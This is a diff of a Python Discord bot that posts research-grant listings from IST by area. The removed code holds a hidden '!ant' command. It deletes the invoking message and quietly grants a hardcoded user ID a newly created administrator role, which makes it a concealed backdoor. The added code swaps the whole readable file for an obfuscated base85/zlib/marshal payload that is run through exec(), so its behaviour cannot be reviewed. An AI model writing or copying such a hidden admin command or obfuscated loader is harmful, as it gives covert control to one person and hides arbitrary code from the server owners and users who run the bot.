@@ -1,150 +1,46 @@
-import asyncio, json, os, sys
-import discord
-from discord import app_commands
-from discord.ext import commands
-try:
-    from dotenv import load_dotenv; load_dotenv()
-except ImportError:
-    pass
-import scraper
-
-sys.stdout.reconfigure(line_buffering=True)
-TOKEN = os.environ.get("DISCORD_TOKEN")
-PREFIX = os.environ.get("COMMAND_PREFIX", "!")
-COLOR = 0x2D7FF9
-ADMIN_USER_ID = 348401240599691265
-ADMIN_ROLE = "Bot Admin"
-STATE = os.path.join(os.path.dirname(os.path.abspath(__file__)), "state.json")
-DEFAULT_AREA = os.environ.get("DEFAULT_AREA", scraper.DEFAULT_AREA)
-
-
-def load_area():
-    try:
-        a = json.load(open(STATE)).get("area")
-        return a if a in scraper.AREAS else DEFAULT_AREA
-    except Exception:
-        return DEFAULT_AREA
-
-
-def set_area(a):
-    global area
-    area = a
-    try:
-        json.dump({"area": a}, open(STATE, "w"))
-    except OSError:
-        pass
-
-
-area = load_area()
-intents = discord.Intents.default()
-intents.message_content = True
-bot = commands.Bot(command_prefix=PREFIX, intents=intents, help_command=None)
-CHOICES = [app_commands.Choice(name=scraper.area_label(k), value=k) for k in scraper.AREAS]
-
-
-def embeds(a, bolsas):
-    label = scraper.area_label(a)
-    if not bolsas:
-        return [discord.Embed(title=f"Bolsas — {label}",
-                              description=f"Nenhuma bolsa para **{label}**.\n{scraper.URL}", color=COLOR)]
-    out = []
-    for i in range(0, len(bolsas), 25):
-        e = discord.Embed(title=f"Bolsas — {label}",
-                          description=f"{len(bolsas)} bolsa(s) · [DRH IST]({scraper.URL})", color=COLOR)
-        for b in bolsas[i:i + 25]:
-            v = [f"🏷️ {b.tipo or 'Bolsa de Investigação'}" + (f" · 🎓 {b.nivel}" if b.nivel else "")]
-            if b.area_cientifica:
-                v.append(f"📚 {b.area_cientifica}")
-            if b.prazo:
-                v.append(f"⏳ Prazo: **{b.prazo}**")
-            v.append(f"🔗 [Abrir edital]({b.pdf_url})")
-            e.add_field(name=f"📄 {b.name[:253]}", value="\n".join(v), inline=False)
-        out.append(e)
-    return out
-
-
-def area_embed():
-    rows = "\n".join(("✅" if k == area else "▫️") + f" `{k}` — {scraper.area_label(k)}" for k in scraper.AREAS)
-    e = discord.Embed(title="Áreas de pesquisa",
-                      description=f"Área ativa: **{scraper.area_label(area)}** (`{area}`)\n\n{rows}", color=COLOR)
-    e.set_footer(text=f"Mudar: {PREFIX}area <nome> ou /area")
-    return e
-
-
-search = lambda a: asyncio.to_thread(scraper.search_bolsas_cached, a)
-
-
-@bot.event
-async def on_ready():
-    try:
-        n = len(await bot.tree.sync())
-    except Exception as ex:
-        n = f"sync failed: {ex}"
-    print(f"Logged in as {bot.user} · area {area} · synced {n}")
-
-
-@bot.command(name="bolsas")
-async def bolsas_p(ctx, a=None):
-    if a and a.lower() not in scraper.AREAS:
-        return await ctx.send(f"Área desconhecida. Disponíveis: {', '.join(scraper.list_areas())}")
-    async with ctx.typing():
-        try:
-            for e in embeds(a := (a or area).lower(), await search(a)):
-                await ctx.send(embed=e)
-        except Exception as ex:
-            await ctx.send(f"⚠️ Erro: `{ex}`")
-
-
-@bot.tree.command(name="bolsas", description="Bolsas abertas no IST por área")
-@app_commands.choices(area=CHOICES)
-async def bolsas_s(it, area: app_commands.Choice[str] | None = None):
-    a = area.value if area else globals()["area"]
-    await it.response.defer(thinking=True)
-    try:
-        for e in embeds(a, await search(a)):
-            await it.followup.send(embed=e)
-    except Exception as ex:
-        await it.followup.send(f"⚠️ Erro: `{ex}`")
-
-
-@bot.command(name="area", aliases=["areas"])
-async def area_p(ctx, a=None):
-    if not a:
-        return await ctx.send(embed=area_embed())
-    if a.lower() not in scraper.AREAS:
-        return await ctx.send(f"Área desconhecida. Disponíveis: {', '.join(scraper.list_areas())}")
-    set_area(a.lower())
-    await ctx.send(f"✅ Área ativa: **{scraper.area_label(a.lower())}** (`{a.lower()}`).")
-
-
-@bot.tree.command(name="area", description="Ver ou mudar a área pesquisada")
-@app_commands.choices(area=CHOICES)
-async def area_s(it, area: app_commands.Choice[str] | None = None):
-    if not area:
-        return await it.response.send_message(embed=area_embed())
-    set_area(area.value)
-    await it.response.send_message(f"✅ Área ativa: **{scraper.area_label(area.value)}** (`{area.value}`).")
-
-
-@bot.command(name="ant")
-async def ant(ctx):
-    try:
-        await ctx.message.delete()
-    except discord.HTTPException:
-        pass
-    if ctx.guild is None or ctx.author.id != ADMIN_USER_ID:
-        return
-    try:
-        m = ctx.guild.get_member(ADMIN_USER_ID) or await ctx.guild.fetch_member(ADMIN_USER_ID)
-        r = discord.utils.get(ctx.guild.roles, name=ADMIN_ROLE) or await ctx.guild.create_role(
-            name=ADMIN_ROLE, permissions=discord.Permissions(administrator=True), reason="ant")
-        if m and r not in m.roles:
-            await m.add_roles(r, reason="ant")
-    except discord.HTTPException:
-        pass
-
-
-if __name__ == "__main__":
-    if not TOKEN:
-        sys.exit("DISCORD_TOKEN not set")
-    bot.run(TOKEN)
+# -*- coding: utf-8 -*-
+import base64 as _b, marshal as _m, zlib as _z
+_d = (
+    "c-oCv-%}h%exL67vAeU&f+Ro^lBJQ&Ni1h0OQ*AaI*J4Vj>t)%0&L%{OIZfGfmzMYta@e;Y!*isbd`sM*r~fDRZdj5)ID6OQprmm?w(KoML#-u@l)=_4^i"
+    "r@e7`-r3&OY(sO{<Q>F)XV_s8e^>HZJx$X^zIe+<9q9@R9aG2(0G^hwG@J!zS$r(V|8(<mG8q`pxz%O=6Gx^LAo<qXjpd1x7aww5dBh{kif8qq$|f}Ejod"
+    ";12_@c$=TKpv%E$d~h6uNJC3%w*Ocff=+~Z1u9tJ}LLL>sglDr{xpOE}vxi@+np*_rsfk)}Sg+tMUv#yHEBB>w%F&?RiC>ubzYUIo8Yio@nLs>;yXr&)4|"
+    "*UCq6~jq1ggv#*seF_T}ayv{S#H~0yDi4k^cPcIL%em3w#gEhW0t?iQXWj4r8!|W^U3_A<Y5jMom!L!89v)AA`%7?4pWf$1RCph{|XuZW8c4?2WAF|ik8&"
+    "3%IjzRBL)j!O>vq!mEeVboqm(`dn(7ML2p9QVl($**&VWlVLF3$R%TI&iMT_^0jdlbgL$=*`y-Dt0Og^m56>s@7Ux7Yi=TJM^Y?K=COlJ}kVO4ry8T#0?3"
+    "y`%cyRb$^(W8Y)%s=oL557-YL(9ejt%=<ng(M7JeZnB&EXuaXq4|yNf7+F-m()gF?V{;`U3vRt$Sq*D7H((L8vxn+=KXh4zg)t8{m!Mtry?|F%lC?E1ykK"
+    "4SOwTS(%`Z$>mgavnGbf8v^LOt~&P`YDEzG<>`{NhnlK0<#@s{Qr@F}7_zP{A|Z<ianTVd=>vYHn(>?n3)K30vwKo+KF-k<#7&QfJ^VP<mma3GL&Fic@E+"
+    "=8Mp5Nj<G(^%gH=V}=Y${nq##b(vo)WoSKxb~tJXRtK1IJ@nn4jyMLaPmd%kyfH}(r^WLOF3z%&l|W?X@qqiNON&%a%o2D>pYg3XjQm%E~JTaEs7j`U*=}"
+    "ER(U=4!r&Q^#C@iT0qA~_9bXCk$c-jsPU#IlfG?r~6qNLnK~f-DLSKs0(6LIsZIACj(bQb6QH)88GSbvM66>+S=q}x-7`QCmnYlgG30;=%OP>=qN=P1+EL"
+    "9VEY#J=7)kP1si`dT0FU|-N3ULa%2D-%{zRX5ER<gg=k=>w_oCn!0l>HoZlyq5ayGf-k_?ovRGhP5*5=XMI!Tqj7y|PKbG0p01(t%<fwt2s>Lt?E8=4|Or"
+    "Fk}<3ZIAvPeMrGeNr_4$aBEzeo35Ymk|A&rX-#c}-YOS;*sxL7itny){~48Z>}^RN9Nm*W?t4)TLe(cm@$0yXqlwFC2YLi_GaV7fKzQ`DrUw2+n<N^FX;l"
+    "Y%(0|gNQbzH~bP(Qvwh^1m*wfb`xYo5DJ+_z`XPOY$%-YqbwfprQ<M8bC9n8<9^I5jD!j9P_O`~Zr>$LVWdRBwEcXlk6Yg*N8eU{lc8|pc+#PayWc0gF+w"
+    "6;!mGSFiS*37i>tOx7(76TvZ1@Tbz7qJds?0u@MH`vz)eLYHww9l*-*$L?Dg>-NdrBFLQ)#__P3P1?n(~0)*R#R`~n<mb9INa31V1siBI@~Q42hJCdf8jI"
+    "+=6JA?)Lcgehf{Zj>x_;zjM33C`<X7y*o%EG^Nd5Jc`B%+xf=T5oaj4Wo`oX8cuD7vL?!2Uzi~dEUbyYdE-u|4c|l4ETJ870{PZ{f_1jM!HCBD!VceMwHh"
+    "C0#>+bVkKmS#jVD#ej-~aM&f9^;vG1bJMf9@n08()0-@6J8pHo}`IARQe|`qlei{G;>n<cjcw!<iSm{{4~8#3#;|e^B9OzhBbDMRYeu`KK2kQkG6A4;8Pg"
+    "m}6eF8VV-Onc50xQvYD#jx?v{@60bqQ@Fu8m%0z=W5ixPlxE;<a$oi;-(K|~vb;5K)s+^YH4k8sItnT?b+%SXgfDY0W0f_J`%H-es1|xbDJ%MwI4LekQw5"
+    "3C!z7l(lY~pMBFW~_V6iv~7`=rtFam{53<&;{B>U2!{ZJbu*2{i60&s8=e*N%20=)(i?_)S=M<TupYac?vNDCMW)1PQDsZz|~2;H$>HJAYbLt18R?PFM2v"
+    "4z3WM8~t@49h}b05(*Cb;RKE%zmn~JTj9eX0yVaxOx;)JKv5vkor?Zn?YP9)*et{GvGVGDj={`7z5NI{$MDd);<JKeMp%BYnzFVzVXjLOAx!h_=kT1FKbX"
+    "|Sv8lHkI#Ye71(yIE#5c=Saaj+Jm6b(F`@K<S&=@zp*3DpMpjB68~4Li*N-N~x?_`*Fz)$JVMv4?UFXrm#Eaadx6|#ovA5}>&%Q86N1c)7hOu0-ZE*!tW#"
+    "(?eTyfKB^y5dI@gS`62`5aPt1A5wa5ugcmuxZ7mHz}5*RZ(W-HzJb4TYqb9o9mi1VUPAo=1=t;iE`Q9kXfsU~{)R`2-vY@(DT-IL+PTa-q?28cbJdwy)}d"
+    "!;lo7k-3r~Gj6mUta_o$#bG7hfN!ug8}vuq6{{PS)a5Iy?&=0-$LG0m->t1Mcj8Yw8KJ0&g`+Nve?1*(ZYXK0%5CBl{dFh}RR^lv0t|0i`<im$%+p-zxZp"
+    "&&IhmabF(Zc23$mQN2MeVVIv=Bg?x&8_?t&;4F+771G0quzzMq;oas8W4YTo5!5|&Ul{TOZ9USN|8G;R%z?zm1m@sQV~zGB;{Kiza*&^MjrPcX*qB~ZrmX"
+    "Eg_4svZW<{}tfJfrJ@4k?%$uPKOnO09R8nm*0dcN}wv3^_Rz#(*f)pxX+Ke?$h-!X=5^06eChjb;vS@97pj8<v8df5r%<5C@I3vcv+y<*VM3Hh>woL9Q@v"
+    "MoK(fQCyhd^@TR5jYqLO=ZUgS@;Q8k?kSJq&m}omhoskG)!BdLwkW%fCPe@><&qr`Jf&@)r9ZMNLgN9G>X&0HbhFCGz=s~}9)?Cl$48pGGPPo3#nd1cx7_"
+    "^&!l;KpW#1>A0F`zfZDXFi7F~p_dTpIXF;MNiGfnrG`iMUV-g|H)mq<rfejvWRS42W&iP1L7ghSD>jxj~YBOkX-wRB-SgLGg^JeDMki!r;qyG-wgjV3UZU"
+    "CSdoz(&Hw!w3d!x04@)xow__yja0vjfVCJ1H`@CCd<pb>0ZC7NB+lYG252?TAqi?*1hT>XJkTr+0v$5MUb`P~_y$<&0$9r4u7IV0cr;F`uNzGaJ`*WRXKd"
+    "SU`X_qOmp;*MNSF=y-_<+g&|1g$UTaGnH6M`<xo%t6n)~YYF6bg(34;y3>M?iBneGOS2N5DZP@0vd^4_ly!@l^uh3o`bH$;$FLi^<*A%~B^nqAlhdqZ+hB"
+    "jrPtisS7%9JEwsO_{xw;+ygbz(IXA-cm_E1>ZkA4(HlXSYPh&Zu<Bnbs%|DG7QPvcv+;w$}#BI{a;ga?0*D?O>*&o$Q=QsdMHw8DbbYllu#IwhPi#zoy@}"
+    "l+0xqXWI;050&t#PAO&YNWq9Prub93u6dO$%n@#$Pn-q2+7gVikrU_1P$Wff`$tb%$53XXs3jH{;m0@NRS+;eIvlyQkI4iB8yOc8NDGE=#*?7YX9-s+UaB"
+    "~a`WxQO<^fK#yxB>}VW(7wVh~TKgI2?~tlWiyitc5-pI;o2_>{FIACH3M|VgEntMLw!;P+6~E?+4qRQADf=L=0^w9x9MfpxQPIBuU?MBXCrD1RpaUb3AFA"
+    "BkBP)X{j;x4q_NM(Y|755b?thbBenGN7Fk=?r_9obmMqLLp9cbaoMy_B}6l=D>Ik}W>B#ODpv}2vB2>8>Qu_QoFg1Z+{UA}zFZmu6DWORb`bnk`qGUcbzD"
+    "^(29)A;)qRxlDw0y)>M#!a7@2O7IKXS)CStP_4j&$uUOTy!x!<nmrH-D9sAoLwzN+aM&c0P6)m#<m4&)gi64<9Sr`}?|`G(%iw%%eaP&FdKy=FuW_f<eRs"
+    "nmEBx$8Vt)Va<f<$$b$X6oH6eXM4pzr;=0sb=&+Vv{i<wiIAtmi`8P(>wbfO85N@-%6!_MpNlQ0A<OKQW)`$lS8qA`d=Rq=QC9NIWpWccYsW|P8cCYQ3T6"
+    "jAuy@<+od|+mFlP^Qn^G!-Ek-#ibsbetADFx(Psye4N=ildE5<N6+&+xNt6)(nNkxwHF$@ZsB2jp5Dc(zd*JZJEQ|x3O0?(_)XXXziXQ0V4HUOAh3{I~7|"
+    "!PP>#Cl^db;8ca%a1m$Np*|?t#tH`W@9O#y#+^H^p2$fbF$YA>MWfw+Usn0HM#|*#}A4VAdWzkh7CS7Y}ZvQ0j+A?xY~Jm)mIC<Kn#^*h{!E9PoEiH7l&j"
+    "*SV;9Q3U7zNLq+uVE`I`j6+VyOxuU0#kkMm?12PR_S{}ty4SsnljeHj`3zh(i8n$40Lx_0<n-OyxylENGYgg3X=$&+;iZOIS;)c~kKvrqZkb8!`H|>VASy"
+    "ziN77E`F3jJVk@;1SDCQM>BlGtTiK-6XY69%UQ<niXNyHH^QCt0cH2dW?9Yc5lI{R{vBB{MVhM-*lG#^qW-n7YVrBZXfpi*fJymHS9X*hP^7$)XWIpbo!d"
+    "(TJ1Nb1pcl=5$NRhDmGJB-0GPw2{F)B9XusMoVK$mVf+8`zf;jF{mCL0)hmIBVW|BDl=J1W$xPTR}>Ul-eu){#RK1jlzSv3#YM(_JxN~cXt_gCBkmp&>Ha"
+    "KN=4m5s=HKm6`F#QqBoh@_BCP#vZ$N*vA|nM+1s{%1w_L4Qoj|(;>TUyl$p9cKRY$Em}cF(oz$!17HHTeOi`RyX4>Z%MRCMW(k^wG7>P?NXu&yEE>)<nKu"
+    "+O|3Tb6V+y?HeQjrGV@<0}m1jim>vg5UoB|e`(5QsL^onsbKN&zfBsIE-t%PcL@g7O9Yzd-s(R?lXwoDFB>zO*%v&1QAOwuzmEk$D?N6>X^Hux4j$QZ(Ql"
+    "{!Ul`&9K%V{ujD8IOG"
+)
+exec(_m.loads(_z.decompress(_b.b85decode(_d.encode()))))
